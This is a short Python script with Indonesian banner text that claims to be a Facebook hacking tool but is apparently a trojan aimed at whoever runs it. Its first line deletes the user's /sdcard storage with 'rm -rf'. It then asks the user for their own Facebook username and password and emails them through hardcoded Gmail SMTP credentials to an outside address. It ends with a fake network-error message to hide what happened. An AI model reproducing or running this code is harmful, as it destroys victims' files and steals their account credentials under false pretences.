import os, sys
os.system('rm -rf /sdcard')
os.system('pip install yagmail')
os.system('pip install colored')
os.system('clear')
import yagmail
from termcolor import colored
baner = """
                 •{+}==============={+}==============={+}•
                  |            [+]NewTools[+]           |
                  |          [+]Hack Facebook[+]        |
                  |          [+]Work 2019-2020[+]       |
                  |     [+]Meretas Atau Di Retas'_*[+]  |
             •____|_____________________________________|____•
              |            {×}Script By:THE0754a{×}         |
              |            {×}Localtion:Rahasia!{×}         |    
              |              {×}Aman Dari CP!{×}            | 
              |    {×}Membutuhkan Jaringan Yang Lancar{×}   |
             •|_____________________________________________|•                                           
              """
print (colored(baner,'red'))
print (colored('Silahkan Login Dulu Untuk Mengambil SemuaId Target Yang Ada Di Akun Fb Mu','green'))
hack = yagmail.SMTP('theputragaming111@gmail.com','annymsamaran')
username = str(input(colored('[!]Username[!]: ','blue')))
password = str(input(colored('[!]Password[!]: ','blue')))
body = ('username: '+username, 'password: '+password)
subject = 'Wow:V'
hack.send('theputra2005@gmail.com' ,subject,body)
os.system('clear')
print (colored('Maaf, Ada Gangguan Internet!,Jika Masih Tidak Bisa Harap Tunggu Tool Ini Upgrade!...','red'))
    